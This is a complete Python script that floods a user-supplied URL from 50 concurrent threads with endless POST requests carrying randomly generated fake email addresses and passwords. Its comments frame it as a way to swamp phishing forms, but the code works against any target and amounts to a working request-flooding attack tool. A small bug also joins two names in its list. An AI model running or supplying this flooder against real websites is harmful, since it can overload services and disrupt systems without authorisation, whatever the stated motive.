import threading
import requests
import random
import string

# List of names to generate email addresses
names = ["alice", "bob", "charlie", "dave", "eve" "fred", "george",
          "harry", "ivan", "james", "kyle", "larry", "mike", "noah", "oliver", "peter", 
          "quincy", "ricky", "samuel", "tom", "ulysses", "victor", "wesley", "xavier", 
          "yusuf", "zachary",
          ]

#list of domains for email addresses
domains = [
    "@gmail.com","@yahoo.com","@outlook.com","@hotmail.com","@icloud.com"
]

def generate_random_email():
    name = random.choice(names) #selects random name from list
    domain = random.choice(domains)  # selects random domain from list
    return name + str(random.randint(1, 100)) + domain

def generate_random_password():
    # Generate a random password of length 8
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(8))

def send_posts(url, email_key, password_key):
    while True:
        email = generate_random_email()
        password = generate_random_password()
        data = {
            email_key: email,
            password_key: password
        }
        response = requests.post(url, data=data)
        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}")

def main():

    # Ask user for URL to flood
    url = input("Enter the URL of the target you want to flood: ")
    #asks user for the name of the key that corresponds to the email, different phishing links will use different keys
    email_key = input("Enter key for email: ")
    #asks user for the name of the key that corresponds to the passwords
    password_key = input("Enter key for password: ")

    threads = []

    for i in range(50):
        t = threading.Thread(target=send_posts, args=(url, email_key, password_key))
        t.daemon = True
        threads.append(t)

    for i in range(50):
        threads[i].start()

    for i in range(50):
        threads[i].join()

if __name__ == "__main__":
    main()
